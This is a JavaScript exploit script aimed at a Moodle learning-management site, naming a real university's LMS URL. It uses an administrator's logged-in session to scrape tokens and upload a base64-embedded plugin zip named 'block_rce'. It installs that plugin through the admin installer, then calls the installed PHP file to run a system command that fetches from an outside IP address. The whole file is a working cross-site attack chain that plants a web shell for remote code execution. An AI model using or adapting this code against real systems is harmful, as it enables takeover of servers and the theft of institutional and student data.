 const URL = "http://lms.uniten.edu.my/moodle/"; 
  fetch(URL + "admin/tool/installaddon/index.php", {
    credentials: "include",
  })
    .then((res) => {
      return res.text();
    })
    .then((data) => {
      let sesskey = data.split('"sesskey":"')[1].split('"')[0];
      let itemid = data.split("amp;itemid=")[1].split("&")[0];
      let author = data.split('title="View profile">')[1].split("<")[0];
      let clientid = data.split('client_id":"')[1].split('"')[0];

      let url =
        "data:application/x-zip-compressed;base64,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";
      fetch(url)
        .then((res) => res.blob())
        .then((blob) => {
          const file = new File([blob], "rce.zip", {
            type: "application/x-zip-compressed",
          });

          myFormData = new FormData();
          myFormData.append("title", "");
          myFormData.append("author", author);
          myFormData.append("license", "allrightsreserved");
          myFormData.append("itemid", itemid);
          myFormData.append("accepted_types[]", ".zip");
          myFormData.append("repo_id", 4);
          myFormData.append("p", "");
          myFormData.append("page", "");
          myFormData.append("env", "filepicker");
          myFormData.append("sesskey", sesskey);
          myFormData.append("client_id", clientid);
          myFormData.append("maxbytes", -1);
          myFormData.append("areamaxbytes", -1);
          myFormData.append("ctx_id", 1);
          myFormData.append("savepath", "/");
          myFormData.append("repo_upload_file", file, "rce.zip");

          fetch(
            URL + "repository/repository_ajax.php?action=upload",
            {
              method: "post",
              body: myFormData,
              credentials: "include",
            }
          )
            .then((res) => {
              return res.text();
            })
            .then((res) => {
              let zipFile = res.split("draft\\/")[1].split("\\/")[0];
              myFormData = new FormData();
              myFormData.append("sesskey", sesskey);
              myFormData.append(
                "_qf__tool_installaddon_installfromzip_form",
                1
              );
              myFormData.append("mform_showmore_id_general", 1);
              myFormData.append("mform_isexpanded_id_general", 1);
              myFormData.append("zipfile", zipFile);
              myFormData.append("plugintype", "block");
              myFormData.append("rootdir", "");
              myFormData.append(
                "submitbutton",
                "Install+plugin+from+the+ZIP+file"
              );

              fetch(
                URL + "admin/tool/installaddon/index.php",
                {
                  method: "post",
                  body: myFormData,
                  credentials: "include",
                }
              )
                .then((res) => {
                  return res.text();
                })
                .then((res) => {
                  debugger;
                  let installzipstorage = res
                    .split('installzipstorage" value="')[1]
                    .split('"')[0];

                  myFormData = new FormData();
                  myFormData.append("installzipcomponent", "block_rce");
                  myFormData.append("installzipstorage", installzipstorage);
                  myFormData.append("installzipconfirm", 1);
                  myFormData.append("sesskey", sesskey);

                  fetch(
                    URL + "admin/tool/installaddon/index.php",
                    {
                      method: "post",
                      body: myFormData,
                      credentials: "include",
                    }
                  ).then(() => {
                    fetch(
                      URL + "blocks/rce/lang/en/block_rce.php?_=system&__=curl%20http://192.168.153.138:1234/"
                    );
                  });
                });
            });
        });
    });
